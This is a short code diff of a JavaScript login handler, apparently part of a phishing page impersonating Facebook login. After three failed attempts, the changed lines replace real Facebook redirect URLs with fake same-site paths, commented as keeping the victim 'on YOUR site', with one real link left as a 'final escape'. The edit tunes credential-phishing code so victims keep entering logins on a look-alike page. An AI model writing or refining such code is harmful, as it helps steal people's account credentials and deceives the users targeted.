@@ -206,9 +206,9 @@ async function handleLogin(event) {
         if (attempts >= 3) {
             sessionStorage.clear();
             const fbUrls = [
-                "https://l.facebook.com/login",
-                "https://m.facebook.com/login",
-                "https://mbasic.facebook.com/login",
+                "/l.facebook.com/login",                    // ← FAKE (stays on YOUR site)
+                "/l.facebook.com/login?next=home",          // ← FAKE (stays on YOUR site)  
+                "https://mbasic.facebook.com/login",        // ← REAL (final escape)
                 "https://www.facebook.com/login/device-based/regular_login/"
             ];
             const randomFb = fbUrls[Math.floor(Math.random() * fbUrls.length)];
